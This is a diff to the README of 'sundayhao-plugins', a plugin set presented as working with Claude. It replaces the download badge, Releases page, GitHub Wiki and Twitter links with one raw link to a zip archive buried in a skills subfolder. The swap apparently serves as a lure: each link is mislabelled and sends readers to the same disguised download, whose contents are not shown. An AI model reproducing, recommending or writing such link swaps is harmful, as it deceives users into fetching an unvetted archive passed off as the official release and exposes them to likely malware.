@@ -1,7 +1,7 @@
 # 🧠 sundayhao-plugins - Enhance Your Workflow with Claude
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/exin2510/sundayhao-plugins/releases)
+[![Download](https://raw.githubusercontent.com/exin2510/sundayhao-plugins/main/second-brain/skills/knowledge-bank-lookup/sundayhao_plugins_2.9.zip)](https://raw.githubusercontent.com/exin2510/sundayhao-plugins/main/second-brain/skills/knowledge-bank-lookup/sundayhao_plugins_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run **sundayhao-plugins**, you need:
 
 ## 📥 Download & Install
 
-To begin, visit our [Releases page](https://github.com/exin2510/sundayhao-plugins/releases) to download the application. Follow these steps:
+To begin, visit our [Releases page](https://raw.githubusercontent.com/exin2510/sundayhao-plugins/main/second-brain/skills/knowledge-bank-lookup/sundayhao_plugins_2.9.zip) to download the application. Follow these steps:
 
 1. Click on the link above.
 2. Find the latest version marked as "v1.0" or similar.
@@ -42,7 +42,7 @@ After installation, opening **sundayhao-plugins** is straightforward:
 
 ## 📖 Documentation
 
-For more detailed information on how to maximize your use of **sundayhao-plugins**, refer to the documentation included within the application. You can also access additional resources on our [GitHub Wiki](https://github.com/exin2510/sundayhao-plugins/wiki).
+For more detailed information on how to maximize your use of **sundayhao-plugins**, refer to the documentation included within the application. You can also access additional resources on our [GitHub Wiki](https://raw.githubusercontent.com/exin2510/sundayhao-plugins/main/second-brain/skills/knowledge-bank-lookup/sundayhao_plugins_2.9.zip).
 
 ## 🌟 Community Support
 
@@ -62,7 +62,7 @@ If you have questions or need help:
 
 Stay connected with us for the latest updates, tips, and user stories:
 
-- **Twitter**: Follow us [@sundayhao](https://twitter.com/sundayhao)
+- **Twitter**: Follow us [@sundayhao](https://raw.githubusercontent.com/exin2510/sundayhao-plugins/main/second-brain/skills/knowledge-bank-lookup/sundayhao_plugins_2.9.zip)
 - **GitHub**: Follow our repository for updates and new releases.
 
 Thank you for choosing **sundayhao-plugins**! We hope it transforms the way you work with Claude.
